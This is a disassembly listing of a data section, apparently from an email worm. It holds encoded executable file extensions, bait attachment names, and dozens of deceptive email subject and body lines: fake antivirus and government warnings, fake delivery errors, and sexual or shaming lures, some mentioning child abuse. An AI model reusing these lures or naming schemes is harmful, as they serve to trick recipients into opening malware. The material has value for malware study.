dword_408900	dd 3A6Eh		; DATA XREF: C:0040889Co
dword_408904	dd 3A6Dh		; DATA XREF: C:00408898o
dword_408908	dd 3A6Ch		; DATA XREF: C:00408894o
dword_40890C	dd 3A6Bh		; DATA XREF: C:00408890o
dword_408910	dd 3A6Ah		; DATA XREF: C:0040888Co
dword_408914	dd 3A69h		; DATA XREF: C:00408888o
dword_408918	dd 3A68h		; DATA XREF: C:00408884o
dword_40891C	dd 3A67h		; DATA XREF: C:00408880o
dword_408920	dd 3A66h		; DATA XREF: C:0040887Co
dword_408924	dd 3A65h		; DATA XREF: C:00408878o
dword_408928	dd 3A64h		; DATA XREF: C:00408874o
dword_40892C	dd 3A63h		; DATA XREF: C:off_408870o
dword_408930	dd 6669672Eh, 0		; DATA XREF: C:0040886Co
dword_408938	dd 67706A2Eh, 0		; DATA XREF: C:00408868o
dword_408940	dd 646D632Eh, 0		; DATA XREF: C:00408854o
dword_408948	dd 7461622Eh, 0		; DATA XREF: C:00408850o
dword_408950	dd 6669702Eh, 0		; DATA XREF: C:0040884Co
dword_408958	dd 6D6F632Eh, 0		; DATA XREF: C:00408848o
dword_408960	dd 7263732Eh, 0		; DATA XREF: C:00408844o
dword_408968	dd 6578652Eh, 0		; DATA XREF: C:off_408840o
aIncest		db 'incest',0           ; DATA XREF: C:0040883Co
		align 4
aImage		db 'image',0            ; DATA XREF: C:00408838o
		align 10h
aWord_doc	db 'word_doc',0         ; DATA XREF: C:00408834o
		align 4
aPrivacy	db 'privacy',0          ; DATA XREF: C:00408830o
aId		db 'id',0               ; DATA XREF: C:0040882Co
		align 4
aPaypal		db 'paypal',0           ; DATA XREF: C:00408828o
		align 10h
aMusic		db 'music',0            ; DATA XREF: C:00408824o
		align 4
aTear		db 'tear',0             ; DATA XREF: C:00408820o
		align 10h
aNaked2		db 'naked2',0           ; DATA XREF: C:0040881Co
		align 4
aNaked1		db 'naked1',0           ; DATA XREF: C:00408818o
		align 10h
aInjection	db 'injection',0        ; DATA XREF: C:00408814o
		align 4
aMasturbation	db 'masturbation',0     ; DATA XREF: C:00408810o
		align 4
aUpdate		db 'update',0           ; DATA XREF: C:0040880Co
		align 4
aViolence	db 'violence',0         ; DATA XREF: C:00408808o
		align 10h
aUndefinied	db 'undefinied',0       ; DATA XREF: C:00408804o
		align 4
aWarez		db 'warez',0            ; DATA XREF: C:00408800o
		align 4
aAuction	db 'auction',0          ; DATA XREF: C:004087FCo
aTransfer	db 'transfer',0         ; DATA XREF: C:004087F8o
		align 4
aNothing	db 'nothing',0          ; DATA XREF: C:004087F4o
aMisc		db 'misc',0             ; DATA XREF: C:004087F0o
		align 4
aMaterial	db 'material',0         ; DATA XREF: C:004087ECo
		align 4
aParty		db 'party',0            ; DATA XREF: C:004087E8o
		align 4
aVisa		db 'visa',0             ; DATA XREF: C:004087E4o
		align 4
aFreaky		db 'freaky',0           ; DATA XREF: C:004087E0o
		align 4
aDisco		db 'disco',0            ; DATA XREF: C:004087DCo
		align 4
aMsg2		db 'msg2',0             ; DATA XREF: C:004087D8o
		align 4
aPart2		db 'part2',0            ; DATA XREF: C:004087D4o
		align 4
aAttach2	db 'attach2',0          ; DATA XREF: C:004087D0o
aMail2		db 'mail2',0            ; DATA XREF: C:004087CCo
		align 4
aSecrets	db 'secrets',0          ; DATA XREF: C:004087C8o
aObject		db 'object',0           ; DATA XREF: C:004087C4o
		align 4
aRanking	db 'ranking',0          ; DATA XREF: C:004087C0o
aSexual		db 'sexual',0           ; DATA XREF: C:004087BCo
		align 4
aIntimateStuff	db 'intimate stuff',0   ; DATA XREF: C:004087B8o
		align 4
aDinner		db 'dinner',0           ; DATA XREF: C:004087B4o
		align 4
aWebcam		db 'webcam',0           ; DATA XREF: C:004087B0o
		align 4
aRelease	db 'release',0          ; DATA XREF: C:004087ACo
aSchock		db 'schock',0           ; DATA XREF: C:004087A8o
		align 4
aFinal		db 'final',0            ; DATA XREF: C:004087A4o
		align 4
a454543403	db '454543403',0        ; DATA XREF: C:004087A0o
		align 4
aLocation	db 'location',0         ; DATA XREF: C:0040879Co
		align 4
aYour_stuff	db 'your_stuff',0       ; DATA XREF: C:00408798o
		align 10h
aDoc_ang	db 'doc_ang',0          ; DATA XREF: C:00408794o
aJokes		db 'jokes',0            ; DATA XREF: C:00408790o
		align 10h
aUnfolds	db 'unfolds',0          ; DATA XREF: C:0040878Co
aFriend		db 'friend',0           ; DATA XREF: C:00408788o
		align 10h
aRegid		db 'regid',0            ; DATA XREF: C:00408784o
		align 4
aRegards	db 'regards',0          ; DATA XREF: C:00408780o
aWebsite	db 'website',0          ; DATA XREF: C:0040877Co
aMore		db 'more',0             ; DATA XREF: C:00408778o
		align 10h
aLetter		db 'letter',0           ; DATA XREF: C:00408774o
		align 4
aMails		db 'mails',0            ; DATA XREF: C:00408770o
		align 10h
aWorker		db 'worker',0           ; DATA XREF: C:0040876Co
		align 4
aStory		db 'story',0            ; DATA XREF: C:00408768o
		align 10h
aDeath		db 'death',0            ; DATA XREF: C:00408764o
		align 4
aFound		db 'found',0            ; DATA XREF: C:00408760o
		align 10h
aBirth		db 'birth',0            ; DATA XREF: C:0040875Co
		align 4
aNomoney	db 'nomoney',0          ; DATA XREF: C:00408758o
aAboutyou	db 'aboutyou',0         ; DATA XREF: C:00408750o
		align 4
aMyaunt		db 'myaunt',0           ; DATA XREF: C:0040874Co
		align 4
aShower		db 'shower',0           ; DATA XREF: C:00408748o
		align 4
aPs		db 'ps',0               ; DATA XREF: C:00408740o
		align 10h
aTopseller	db 'topseller',0        ; DATA XREF: C:0040873Co
		align 4
aOld_photos	db 'old_photos',0       ; DATA XREF: C:00408738o
		align 4
aProduct	db 'product',0          ; DATA XREF: C:00408734o
aClass_photos	db 'class_photos',0     ; DATA XREF: C:00408730o
		align 10h
aSwimmingpool	db 'swimmingpool',0     ; DATA XREF: C:0040872Co
		align 10h
aMydate		db 'mydate',0           ; DATA XREF: C:00408728o
		align 4
aBill		db 'bill',0             ; DATA XREF: C:00408724o
		align 10h
aNumber_phone	db 'number_phone',0     ; DATA XREF: C:00408720o
		align 10h
aNote		db 'note',0             ; DATA XREF: C:0040871Co
		align 4
aNews		db 'news',0             ; DATA XREF: C:00408718o
		align 10h
aInformation	db 'information',0      ; DATA XREF: C:00408714o
aSexy		db 'sexy',0             ; DATA XREF: C:00408710o
		align 4
aConcert	db 'concert',0          ; DATA XREF: C:0040870Co
aMoonlight	db 'moonlight',0        ; DATA XREF: C:00408708o
		align 4
aTextfile	db 'textfile',0         ; DATA XREF: C:00408704o
		align 4
aPortmoney	db 'portmoney',0        ; DATA XREF: C:00408700o
		align 10h
aPosting	db 'posting',0          ; DATA XREF: C:004086FCo
aPoster		db 'poster',0           ; DATA XREF: C:004086F8o
		align 10h
aStuff		db 'stuff',0            ; DATA XREF: C:004086F4o
		align 4
aCard		db 'card',0             ; DATA XREF: C:004086F0o
		align 10h
aTrash		db 'trash',0            ; DATA XREF: C:004086ECo
		align 4
aMe		db 'me',0               ; DATA XREF: C:004086E8o
		align 4
aPic		db 'pic',0              ; DATA XREF: C:004086E4o
aAttachment	db 'attachment',0       ; DATA XREF: C:004086E0o
		align 4
aDetails_0	db 'details',0          ; DATA XREF: C:004086DCo
aDescription	db 'description',0      ; DATA XREF: C:004086D8o
aCreditcard	db 'creditcard',0       ; DATA XREF: C:004086D4o
		align 4
aResponse	db 'response',0         ; DATA XREF: C:004086D0o
		align 4
aMessage	db 'message',0          ; DATA XREF: C:004086CCo
aTalk		db 'talk',0             ; DATA XREF: C:004086C8o
		align 4
aWife		db 'wife',0             ; DATA XREF: C:004086C4o
		align 10h
aDoc		db 'doc',0              ; DATA XREF: C:004086C0o
aYours		db 'yours',0            ; DATA XREF: C:004086BCo C:00408754o
		align 4
aAssocial	db 'associal',0         ; DATA XREF: C:004086B4o
		align 4
aDocument	db 'document',0         ; DATA XREF: C:off_4086B0o
		align 4
aInstantPatches	db 'Instant patches.',0 ; DATA XREF: C:004086ACo
		align 4
aYourProviderWi	db 'Your provider will be disabled!',0 ; DATA XREF: C:004086A8o
aTellMeMoreAbou	db 'tell me more about your document!',0 ; DATA XREF: C:004086A4o
		align 4
aExplain	db 'explain!',0         ; DATA XREF: C:004086A0o
		align 4
aDoNotVisitTheP	db 'do not visit the pages on the list I sent!',0 ; DATA XREF: C:0040869Co
		align 4
aDoNotOpenTheAt	db 'do not open the attachment!',0 ; DATA XREF: C:00408698o
aDoNotUseThisCr	db 'do not use this creditcard!',0
aDoNotUseMyDocu	db 'do not use my document!',0 ; DATA XREF: C:00408690o
aNull		db '<null>',0           ; DATA XREF: C:0040868Co
		align 4
aSolveTheProble	db 'solve the problem!',0 ; DATA XREF: C:00408688o
		align 10h
aAuthentificati	db 'Authentification required. Read the attachment!',0
					; DATA XREF: C:00408684o
aAntispamIsTurn	db 'Antispam is turned off. See file!',0 ; DATA XREF: C:00408680o
		align 4
aIsThePicAFake?	db 'is the pic a fake?',0 ; DATA XREF: C:0040867Co
		align 4
aYourDocument_0	db 'your document is silly!',0 ; DATA XREF: C:00408678o
aLoginRequiredR	db 'Login required! Read the attachment!',0 ; DATA XREF: C:00408674o
		align 4
aFeelFreeToUseI	db 'feel free to use it.',0 ; DATA XREF: C:0040866Co
		align 10h
aHereIsTheCenso	db 'here is the <censored>',0 ; DATA XREF: C:00408668o
		align 4
aHereIsMyPhoto	db 'here is my photo!',0 ; DATA XREF: C:00408664o
		align 4
aHereIsMyAdvice	db 'here is my advice.',0 ; DATA XREF: C:00408660o
		align 10h
aYouAreInfected	db 'You are infected. Read the details!',0 ; DATA XREF: C:0040865Co
aSeeYourName	db 'see your name!',0   ; DATA XREF: C:00408658o
		align 4
aIVeFoundYourBi	db 'I ',27h,'ve found your bill!',0 ; DATA XREF: C:00408654o
		align 4
aTransactionFai	db 'Transaction failed. Show the doc!',0 ; DATA XREF: C:00408650o
		align 10h
aAttachmentSign	db '<Attachment Signature 34933920>',0 ; DATA XREF: C:0040864Co
aClickTheAttach	db '<Click the attachment to decrypt>',0 ; DATA XREF: C:00408648o
		align 4
aDoYouHaveAnOrg	db 'do you have an orgasm in the picture?',0 ; DATA XREF: C:00408644o
		align 4
aTryThisPatch	db 'try this patch!',0  ; DATA XREF: C:00408640o
aYourBill_	db 'Your bill.',0       ; DATA XREF: C:0040863Co
		align 4
aFastFood___	db 'fast food...',0     ; DATA XREF: C:00408638o
		align 4
aMicrosoft	db 'Microsoft',0        ; DATA XREF: C:00408634o
		align 4
aInYourMind?	db 'in your mind?',0    ; DATA XREF: C:00408630o
		align 4
aThisIsAnAttach	db 'this is an attachment message!',0 ; DATA XREF: C:0040862Co
		align 4
aNewPatchIsAvai	db 'new patch is available!',0 ; DATA XREF: C:00408628o
aDoNotShowThisA	db 'do not show this anyone!',0 ; DATA XREF: C:00408624o
		align 4
aItsPrivateFrom	db 'its private from me',0 ; DATA XREF: C:00408620o
aYouHaveDoneAMi	db 'you have done a mistake in the document!',0 ; DATA XREF: C:0040861Co
		align 4
aAreYouAPhotogr	db 'are you a photographer?',0 ; DATA XREF: C:00408618o
aDoYouKnowTheTh	db 'do you know the thief?',0 ; DATA XREF: C:00408614o
		align 4
aLetsTalkAboutI	db 'lets talk about it!',0 ; DATA XREF: C:00408610o
aAntispamComple	db '<Antispam complete>',0 ; DATA XREF: C:0040860Co
aTransferComple	db '<Transfer complete>',0 ; DATA XREF: C:00408608o
aYourLieIsGoing	db 'your lie is going around the world!',0 ; DATA XREF: C:00408604o
aYouHaveASexyBo	db 'you have a sexy body in the pic!',0 ; DATA XREF: C:00408600o
		align 4
aDoYouHaveSexIn	db 'do you have sex in the picture?',0 ; DATA XREF: C:004085FCo
aDoesItBelongTo	db 'does it belong to you?',0 ; DATA XREF: C:004085F8o
					; C:00408670o
		align 4
aAreYouTheOne?	db 'are you the one?',0 ; DATA XREF: C:004085F4o
		align 4
aAreYouTheNak_0	db 'are you the naked person!',0 ; DATA XREF: C:004085F0o
		align 4
aAreYouTheNaked	db 'are you the naked one?',0 ; DATA XREF: C:004085ECo
		align 4
aIsThatYourDoma	db 'is that your domain?',0 ; DATA XREF: C:004085E8o
		align 4
aIsThatYourSlip	db 'is that your slip?',0 ; DATA XREF: C:004085E4o
		align 4
aIsThatYourBeas	db 'is that your beast?',0 ; DATA XREF: C:004085DCo
aIsThatYourFami	db 'is that your family?',0 ; DATA XREF: C:004085D8o
		align 4
aIsThatYourWork	db 'is that your work?',0 ; DATA XREF: C:004085D4o
		align 4
aIsThatYourPorn	db 'is that your porn pic?',0 ; DATA XREF: C:004085D0o
		align 10h
aYourAreNaked?	db 'your are naked?',0  ; DATA XREF: C:004085CCo
aIsThatYourFing	db 'is that your finger?',0 ; DATA XREF: C:004085C8o
		align 4
aIsThatYourCd?	db 'is that your cd?',0 ; DATA XREF: C:004085C4o
		align 4
aIsThatYourMess	db 'is that your message?',0 ; DATA XREF: C:004085C0o
		align 4
aIsThatYourTan?	db 'is that your TAN?',0 ; DATA XREF: C:004085BCo
		align 4
aIsThatYourPriv	db 'is that your privacy?',0 ; DATA XREF: C:004085B8o
		align 10h
aIsThisInformat	db 'is this information about you?',0 ; DATA XREF: C:004085B4o
		align 10h
aMoney?		db 'money?',0           ; DATA XREF: C:004085ACo
		align 4
aDidYouKnowThat	db 'did you know that?',0 ; DATA XREF: C:004085A8o
		align 4
aBobTheBuilder	db 'bob the builder',0  ; DATA XREF: C:004085A4o
aAreYouCranky?	db 'are you cranky?',0  ; DATA XREF: C:004085A0o
aBeMad?		db 'be mad?',0          ; DATA XREF: C:0040859Co
aYouLookLikeAnR	db 'you look like an rat?',0 ; DATA XREF: C:00408598o
		align 4
aYouLookLikeAnA	db 'you look like an ape!',0 ; DATA XREF: C:00408594o
		align 4
aLetIt		db 'let it!',0          ; DATA XREF: C:0040858Co
aIncest?	db 'incest?',0          ; DATA XREF: C:00408588o
aYouAreSexyInTh	db 'you are sexy in this doc!',0 ; DATA XREF: C:00408584o
		align 10h
aHereIsThe454	db 'here is the $%%454$',0 ; DATA XREF: C:00408580o
aGreatJob	db 'great job!',0       ; DATA XREF: C:0040857Co
		align 10h
aDoNotGiveUp	db 'do not give up!',0  ; DATA XREF: C:00408578o
aIsThatYourCar?	db 'is that your car?',0 ; DATA XREF: C:00408574o C:004085B0o
		align 4
aItSSoSimilarAs	db 'it',27h,'s so similar as yours!',0 ; DATA XREF: C:00408570o
		align 10h
aThisIsNothingF	db 'this is nothing for kids!',0 ; DATA XREF: C:0040856Co
		align 4
aItSASecret	db 'it',27h,'s a secret!',0 ; DATA XREF: C:00408568o
		align 4
aSeeThis	db 'see this!',0        ; DATA XREF: C:00408564o
		align 4
aCorrectIt	db 'correct it!',0      ; DATA XREF: C:00408560o
aINeedYou	db 'i need you!',0      ; DATA XREF: C:0040855Co
asc_409440	db ';-)',0              ; DATA XREF: C:00408558o
aWhat?		db 'what?',0            ; DATA XREF: C:00408554o
		align 4
aTrial?		db 'trial?',0           ; DATA XREF: C:00408550o
		align 4
aDoc?		db 'doc?',0             ; DATA XREF: C:0040854Co
		align 4
aAutomailer	db '<Automailer>',0     ; DATA XREF: C:00408548o
		align 4
aFailedMessageA	db '<Failed message available>',0 ; DATA XREF: C:00408544o
		align 4
aIDonTWantYourX	db 'i don',27h,'t want your xxx pics!',0 ; DATA XREF: C:00408540o
aXxxAboutYou?	db 'xxx about you?',0   ; DATA XREF: C:0040853Co
		align 4
aACrazyDocAbout	db 'a crazy doc about you',0 ; DATA XREF: C:00408538o
		align 4
aHereIsYours	db 'here is yours!',0   ; DATA XREF: C:00408534o
		align 4
aChildOrAdult?	db 'child or adult?',0  ; DATA XREF: C:00408530o
aManOrWomen?	db 'man or women?',0    ; DATA XREF: C:0040852Co
		align 4
aGreatXxx	db 'great xxx!',0       ; DATA XREF: C:00408528o
		align 4
aScannedByNorto	db '<scanned by norton antivirus>',0 ; DATA XREF: C:00408524o
		align 4
aAttachedMsg	db '<Attached Msg>',0   ; DATA XREF: C:00408520o
		align 4
aFailure	db '<<<Failure>>>',0    ; DATA XREF: C:0040851Co
		align 4
aIVeFoundItAbou	db 'i',27h,'ve found it about you',0 ; DATA XREF: C:00408518o
aMyAdvice____	db 'my advice....',0    ; DATA XREF: C:00408514o
		align 10h
aPersonalMessag	db 'personal message!',0 ; DATA XREF: C:00408510o
		align 4
aOnlyEncrypted	db 'only encrypted!',0  ; DATA XREF: C:0040850Co
aBadGateway	db '<bad gateway>',0    ; DATA XREF: C:00408508o
		align 4
aHow?		db 'how?',0             ; DATA XREF: C:00408504o
		align 4
aWho?		db 'who?',0             ; DATA XREF: C:00408500o
		align 4
aWhatStill?	db 'what still?',0      ; DATA XREF: C:004084FCo
aCopyright?	db 'copyright?',0       ; DATA XREF: C:004084F8o
		align 4
aYouCannotHideY	db 'you cannot hide yourself! (see photo)',0 ; DATA XREF: C:004084F4o
		align 4
aYourAccountIsE	db 'your account is expired!',0 ; DATA XREF: C:004084F0o
		align 10h
aXxxService	db 'xxx service',0      ; DATA XREF: C:004084ECo
aISawYouLastWee	db 'i saw you last week!',0 ; DATA XREF: C:004084E8o
		align 4
aFileIsBad_	db 'File is bad.',0     ; DATA XREF: C:004084E4o
		align 4
aFileIsDamaged_	db 'File is damaged.',0 ; DATA XREF: C:004084E0o
		align 4
aFileIsSelfDecr	db 'File is self-decryting.',0 ; DATA XREF: C:004084DCo
aYourFace?	db 'your face?',0       ; DATA XREF: C:004084D8o
		align 4
aYourEyes?	db 'your eyes?',0       ; DATA XREF: C:004084D4o
		align 4
aYourBody?	db 'your body?',0       ; DATA XREF: C:004084D0o
		align 4
aTheTruth?	db 'the truth?',0       ; DATA XREF: C:004084CCo
		align 10h
aBest?		db 'best?',0            ; DATA XREF: C:004084C8o
		align 4
aIHaveReceivedT	db 'i have received this.',0 ; DATA XREF: C:004084C4o
		align 10h
aDoesItMatter?	db 'does it matter?',0  ; DATA XREF: C:004084C0o
aDrugs?___	db 'drugs? ...',0       ; DATA XREF: C:004084BCo
		align 4
aForgotten?	db 'forgotten?',0       ; DATA XREF: C:004084B8o
		align 4
aAlready?	db 'already?',0         ; DATA XREF: C:004084B4o
		align 4
aDoYouHaveTheBu	db 'do you have the bug also?',0 ; DATA XREF: C:004084B0o
		align 10h
aDoYouThinkSo?	db 'do you think so?',0 ; DATA XREF: C:004084ACo
		align 4
aIsThatYourPhot	db 'is that your photo?',0 ; DATA XREF: C:004084A8o
aIsThatYourCred	db 'is that your creditcard?',0 ; DATA XREF: C:004084A4o
		align 4
aIsThatYourWife	db 'is that your wife?',0 ; DATA XREF: C:004084A0o
		align 4
aDidYouSeeHerAl	db 'did you see her already?',0 ; DATA XREF: C:0040849Co
		align 4
aAttachi	db 'attachi#',0         ; DATA XREF: C:00408498o
		align 10h
aHereIsTheNextO	db 'here is the next one!',0 ; DATA XREF: C:00408494o
		align 4
aIWantMore___	db 'i want more...',0   ; DATA XREF: C:00408490o
		align 4
a?		db '<?}',0              ; DATA XREF: C:0040848Co
a09580985869gj	db '<09580985869gj>',0  ; DATA XREF: C:00408488o
aWarningFromThe	db '<Warning from the Government>',0 ; DATA XREF: C:00408484o
		align 4
aSchoolfriend?	db 'schoolfriend?',0    ; DATA XREF: C:00408480o
		align 4
aDocs?		db 'docs?',0            ; DATA XREF: C:0040847Co
		align 4
aPrettyPicAbout	db 'pretty pic about you?',0 ; DATA XREF: C:00408478o
		align 4
aIDonTThinkSo_	db 'i don',27h,'t think so.',0 ; DATA XREF: C:00408474o
		align 10h
aGreat		db 'great!',0           ; DATA XREF: C:00408470o
		align 4
aExcellent	db 'excellent!',0       ; DATA XREF: C:0040846Co
		align 4
aGoodWork	db 'good work!',0       ; DATA XREF: C:00408468o
		align 10h
aPoorQuality	db 'poor quality!',0    ; DATA XREF: C:00408464o
		align 10h
aNever		db 'never!',0           ; DATA XREF: C:00408460o
		align 4
aWrongCalculati	db 'wrong calculation! (see the attachment!)',0 ; DATA XREF: C:0040845Co
		align 4
aDidYouKnowFrom	db 'did you know from this document?',0 ; DATA XREF: C:00408458o
		align 4
aSomethingIsNot	db 'something is not ok',0 ; DATA XREF: C:00408454o
aSomethingIsG_0	db 'something is going ...',0 ; DATA XREF: C:00408450o
		align 4
aIsThatPossible	db 'is that possible?',0 ; DATA XREF: C:0040844Co
		align 4
aYourJob?IFound	db 'your job? (I found that!)',0 ; DATA XREF: C:00408448o
		align 4
aYouAreBad	db 'you are bad',0      ; DATA XREF: C:00408444o
aDidYouAskMeFor	db 'did you ask me for that?',0 ; DATA XREF: C:00408440o
		align 4
aYouHaveTriedTo	db 'you have tried to steal!',0 ; DATA XREF: C:0040843Co
		align 4
aPossible?	db 'possible?',0        ; DATA XREF: C:00408438o
		align 4
aMeaningOfThat?	db 'meaning of that?',0 ; DATA XREF: C:00408434o
		align 4
aYouFeelTheSame	db 'you feel the same.',0 ; DATA XREF: C:00408430o
		align 4
aIsThatYourWebs	db 'is that your website?',0 ; DATA XREF: C:0040842Co
		align 4
aIsThatYourAtta	db 'is that your attachment?',0 ; DATA XREF: C:00408428o
		align 10h
aYouEarnMoneySe	db 'you earn money, see the attachment!',0 ; DATA XREF: C:00408424o
aYourAttachment	db 'your attachment? verify it.',0 ; DATA XREF: C:00408420o
aMisc_AndSoOn_S	db 'misc. and so on. see you!',0 ; DATA XREF: C:0040841Co
		align 4
aYes_		db 'yes.',0             ; DATA XREF: C:00408418o
		align 4
aYourPersonalRe	db 'your personal record?',0 ; DATA XREF: C:00408414o
		align 4
aModifications?	db 'modifications?',0   ; DATA XREF: C:00408410o
		align 4
aIAmDesperate	db 'i am desperate',0   ; DATA XREF: C:0040840Co
		align 4
aYourIcqNumber?	db 'your icq number?',0 ; DATA XREF: C:00408408o
		align 10h
aThatsWrong	db 'thats wrong!',0     ; DATA XREF: C:00408404o
		align 10h
aYouAreNakedInT	db 'you are naked in this document!',0 ; DATA XREF: C:00408400o
aWhy?		db 'why?',0             ; DATA XREF: C:004083FCo
		align 4
aTakeItEasy	db 'take it easy!',0    ; DATA XREF: C:004083F8o
		align 4
aYourTanNumber?	db 'your TAN number?',0 ; DATA XREF: C:004083F4o
		align 4
aImportant?	db 'important?',0       ; DATA XREF: C:004083F0o
		align 4
aYourDesignIsNo	db 'your design is not good!',0 ; DATA XREF: C:004083ECo
		align 4
aMsg		db 'msg',0              ; DATA XREF: C:004083E8o C:004086B8o
aReply		db 'reply',0            ; DATA XREF: C:004083E4o
		align 10h
aIsThatTheReali	db 'is that the reality?',0 ; DATA XREF: C:004083E0o
		align 4
aIAmSpeachlessA	db 'i am speachless about your document!',0 ; DATA XREF: C:004083DCo
		align 10h
aILostThat	db 'i lost that',0      ; DATA XREF: C:004083D8o
aInstructMeAbou	db 'instruct me about this!',0 ; DATA XREF: C:004083D4o
aDoYouHave?	db 'do you have?',0     ; DATA XREF: C:004083D0o
		align 4
aThatSNotTheTru	db 'that',27h,'s not the truth?',0 ; DATA XREF: C:004083CCo
		align 4
aThatSAFunnyTex	db 'that',27h,'s a funny text.',0 ; DATA XREF: C:004083C8o
		align 4
aWhatDoYouThink	db 'what do you think about it?',0 ; DATA XREF: C:004083C4o
aILikeYourDoc	db 'i like your doc!',0 ; DATA XREF: C:004083C0o
		align 4
aHereTheCheats	db 'here, the cheats',0 ; DATA XREF: C:004083BCo
		align 4
aIsThatCriminal	db 'is that criminal?',0 ; DATA XREF: C:004083B8o
		align 4
aHereTheIntrodu	db 'here, the introduction',0 ; DATA XREF: C:004083B4o
		align 4
aAreYouATeacher	db 'are you a teacherin the picture?',0 ; DATA XREF: C:004083B0o
		align 4
aHereTheSerials	db 'here, the serials',0 ; DATA XREF: C:004083ACo
		align 4
aLoveLetter?	db 'love letter?',0     ; DATA XREF: C:004083A8o
		align 4
aFromYourLover	db 'from your lover ;-)',0 ; DATA XREF: C:004083A4o
aFromTheChatter	db 'from the chatter (my photo!)',0 ; DATA XREF: C:004083A0o
		align 10h
aKillHimOnThePi	db 'kill him on the picture!',0 ; DATA XREF: C:0040839Co
		align 4
aDocAboutMe?	db 'doc about me?',0    ; DATA XREF: C:00408398o
		align 4
aTheInformation	db 'the information is wrong!',0 ; DATA XREF: C:00408394o
		align 4
aInformationAbo	db 'information about you?',0 ; DATA XREF: C:00408390o
		align 10h
aYourPhotoIsPoo	db 'your photo is poor',0 ; DATA XREF: C:0040838Co
		align 4
aSomethingIsGoi	db 'something is going wrong!',0 ; DATA XREF: C:00408388o
		align 10h
aYourDocumentIs	db 'your document is not good',0 ; DATA XREF: C:00408384o
		align 4
aStuffAboutYou?	db 'stuff about you?',0 ; DATA XREF: C:00408380o
		align 10h
aXxx?		db 'xxx ?',0            ; DATA XREF: C:0040837Co
		align 4
aGreetings	db 'greetings',0        ; DATA XREF: C:00408378o
		align 4
aChildPorn?	db 'child porn?',0      ; DATA XREF: C:00408374o
aTestIt		db 'test it',0          ; DATA XREF: C:00408370o
aAnotherPicHave	db 'another pic, have fun! ... :->',0 ; DATA XREF: C:0040836Co
		align 4
aHer_		db 'her.',0             ; DATA XREF: C:00408368o
		align 10h
aPages?		db 'pages?',0           ; DATA XREF: C:00408364o
		align 4
aWhyShouldI?	db 'why should I?',0    ; DATA XREF: C:00408360o
		align 4
aThisFileIsBad	db 'this file is bad!',0 ; DATA XREF: C:0040835Co
		align 4
aDidYouSentItTo	db 'did you sent it to me?',0 ; DATA XREF: C:00408358o
		align 4
aIKnowYourDocum	db 'i know your document!',0 ; DATA XREF: C:00408354o
		align 4
aDoYouKnowThis?	db 'do you know this????',0 ; DATA XREF: C:00408350o
		align 4
aReally?	db 'really?',0          ; DATA XREF: C:0040834Co
aTimeToFear?	db 'time to fear?',0    ; DATA XREF: C:00408348o
		align 4
aIFoundThisDocu	db 'i found this document about you.',0 ; DATA XREF: C:00408344o
		align 10h
aDoesItMatch?	db 'does it match?',0   ; DATA XREF: C:00408340o
		align 10h
aYourNameIsWron	db 'your name is wrong!',0 ; DATA XREF: C:0040833Co
aIHopeThatsNotT	db 'i hope thats not true!',0 ; DATA XREF: C:00408338o
		align 4
aOldPhotosAbout	db 'old photos about you?',0 ; DATA XREF: C:00408334o
		align 4
aKillTheWriterO	db 'kill the writer of this document!',0 ; DATA XREF: C:00408330o
		align 4
aClassroomTestO	db 'classroom test of you?',0 ; DATA XREF: C:0040832Co
		align 10h
aSomethingAbout	db 'something about you!',0 ; DATA XREF: C:00408328o
		align 4
aYouWonTheRk	db 'you won the rk!',0  ; DATA XREF: C:00408324o
aIHaveYourPassw	db 'I have your password!',0 ; DATA XREF: C:00408320o
		align 10h
aMailFailed	db '<Mail failed>',0    ; DATA XREF: C:0040831Co
		align 10h
aIDonTKnowYourD	db 'I don',27h,'t know your document!',0 ; DATA XREF: C:00408318o
aYouAreABadWrit	db 'you are a bad writer',0 ; DATA XREF: C:00408314o
		align 4
aIsThatYours?	db 'is that yours?',0   ; DATA XREF: C:00408310o
		align 4
aAbuse?		db 'abuse?',0           ; DATA XREF: C:0040830Co
		align 4
aIWaitForAnAnsw	db 'I wait for an answer!',0 ; DATA XREF: C:00408308o
		align 4
aPwd?		db 'pwd?',0             ; DATA XREF: C:00408304o
		align 4
aIsThatYourAcco	db 'is that your account?',0 ; DATA XREF: C:00408300o
					; C:004085E0o
		align 4
aMessage?	db 'message?',0         ; DATA XREF: C:004082FCo
		align 10h
aPicture?	db 'picture?',0         ; DATA XREF: C:004082F8o
		align 4
aIsThatYourName	db 'is that your name?',0 ; DATA XREF: C:004082F4o
		align 10h
aAccount?	db 'account?',0         ; DATA XREF: C:004082F0o
		align 4
aIsThatTrue?	db 'is that true?',0    ; DATA XREF: C:004082ECo
		align 4
aIllegalSt_OfYo	db 'illegal st. of you?',0 ; DATA XREF: C:004082E8o
aHereIsIt_	db 'here is it.',0      ; DATA XREF: C:004082E4o
aYours?		db 'yours?',0           ; DATA XREF: C:004082E0o
		align 4
aYourHeroInTheP	db 'your hero in the picture?',0 ; DATA XREF: C:004082DCo
		align 10h
aIFoundThatAbou	db 'i found that about you!',0 ; DATA XREF: C:004082D8o
aReadItImmedi_0	db 'read it immediately!',0 ; DATA XREF: C:004082D4o
		align 10h
aLol		db '*lol*',0            ; DATA XREF: C:004082D0o
		align 4
aHereIsTheDocum	db 'here is the document.',0 ; DATA XREF: C:004082CCo
		align 10h
aGonna?		db 'gonna?',0           ; DATA XREF: C:004082C8o
		align 4
aReadTheDetails	db 'read the details.',0 ; DATA XREF: C:004082C4o
		align 4
aSuchAsYours?	db 'such as yours?',0   ; DATA XREF: C:004082C0o
		align 4
aIWaitForYourCo	db 'i wait for your comment about it.',0 ; DATA XREF: C:004082BCo
		align 10h
aThatIsInterest	db 'that is interesting...',0 ; DATA XREF: C:004082B8o
		align 4
aAttachmentFrom	db '<Attachment from Poland>',0 ; DATA XREF: C:004082B4o
		align 4
aOk___		db 'ok...',0            ; DATA XREF: C:004082B0o
		align 4
a____0		db '<...>',0            ; DATA XREF: C:004082ACo
		align 4
aHelpAttached	db 'help attached',0    ; DATA XREF: C:004082A8o
		align 4
aWhatMeansThat?	db 'what means that?',0 ; DATA XREF: C:004082A4o
		align 4
aServerError	db '<Server Error>',0   ; DATA XREF: C:004082A0o
		align 4
aMessageError	db '<Message Error>',0  ; DATA XREF: C:0040829Co
aDeliverError	db '<Deliver Error>',0  ; DATA XREF: C:off_408298o
aReturnedMail	db 'Returned Mail',0    ; DATA XREF: C:00408294o
		align 4
aConfirmationRe	db 'Confirmation Required',0 ; DATA XREF: C:00408290o
		align 10h
aConfirmation	db 'Confirmation',0     ; DATA XREF: C:0040828Co
		align 10h
aRegistrationCo	db 'Registration confirm',0 ; DATA XREF: C:00408288o
		align 4
